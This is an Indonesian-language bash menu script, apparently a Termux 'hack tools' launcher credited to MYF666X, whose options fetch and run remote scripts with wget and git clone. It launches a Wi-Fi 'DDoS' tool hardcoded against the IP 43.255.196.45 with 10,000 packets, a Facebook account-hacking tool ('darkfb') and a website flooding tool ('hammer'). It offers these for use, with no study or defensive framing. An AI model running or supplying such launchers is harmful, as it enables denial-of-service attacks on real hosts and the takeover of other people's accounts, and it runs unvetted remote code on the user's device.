#usr/bin/bash
clear
#ini warna
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
# Recode BY ToniHack
echo
echo
# Ini Paket Untuk menjalankan Tools nya
Hacked.sh
echo
clear
echo
echo $pur"   Tools:Terbaru | Versi:6.0 New *_*"
echo $me" Author:Mr.MYF666X | Kontak:081230597569"
echo  $i"        [+]HACK TOOLS BY MYF666X[+]"
echo $cy"╔════╗╔══════════════════════╗╔══════════╗"
echo $me"║ NO ║║  { KUMPULAN TOOLS }  ║║{  TONI  }║"
echo $cy"╚════╝╚════════════════════> ╚╝ <════════╝"
echo $cy"╔════╗╔══════════════════════╗"
echo $bi"║ 01 ║║Install Metasploit    ║"
echo $cy"╚════╝╚══════════════════════╝"
echo $cy"╔════╗╔══════════════════════╗"
echo $bi"║ 02 ║║Tools TU4NB4DUT       ║"
echo $cy"╚════╝╚══════════════════════╝"
echo $cy"╔════╗╔══════════════════════╗"
echo $bi"║ 03 ║║DDOS WIFI             ║"
echo $cy"╚════╝╚══════════════════════╝"
echo $cy"╔════╗╔══════════════════════╗"
echo $bi"║ 04 ║║HackFB (cepat)        ║"
echo $cy"╚════╝╚══════════════════════╝"
echo $cy"╔════╗╔══════════════════════╗"
echo $bi"║ 05 ║║DDOS WEBSITE          ║"
echo $cy"╚════╝╚══════════════════════╝"
echo $cy"╔════╗╔══════════════════════╗"
echo $bi"║ 06 ║║EXIT                  ║"
echo $cy"╚════╝╚══════════════════════╝"
echo  $i"┌==="$bi"[ MYF666X ]"
echo $cy"¦"
read -p">>>" pil;

if [ $pil = 1 ]
then
clear
pkg update -y
pkg upgrade -y
pkg install wget -y
wget https://5hady.github.io/metasploit.sh
bash metasploit.sh
msfconsole
fi

if [ $pil = 2 ]
then
clear
apt update -y
apt upgrade -y
apt install python python2 vim figlet culr
apt install php
pip2 install lolcat
apt install git
git clone https://github.com/TU4NB4DUT/TOOLSINSTALLERv3
cd TOOLSINSTALLERv3
chmod +x TU4NB4DUT.sh
sh TU4NB4DUT.sh
fi

if [ $pil = 3 ]
then
clear
apt update
apt install php
apt install git
git clone https://github.com/4L13199/LITEDDOS
cd LITEDDOS
python2 LITEDDOS.py 43.255.196.45 80 10000
fi

if [ $pil = 4 ]
then
apt update
apt upgrade
apt install git
apt install python2
git clone https://github.com/storiku/darkfb
cd darkfb
pip install mechanize
pip install requests
python2 Dark.py
fi

if [ $pil = 5 ]
then
apt update
apt upgrade
apt install git
apt install python2
git clone https://github.com/cyweb/hammer
cd hammer
python hammer.py
fi

if [ $pil = 6 ]
then
clear
figlet -f slant "E X I T"|lolcat
sleep 2
echo $me"Terimah Kasih Sudah Menggunakan Tools saya"
sleep 2
echo $i"SALAM HACKER"
sleep 2
echo $i"Thanks To:MYF666X"
exit
fi

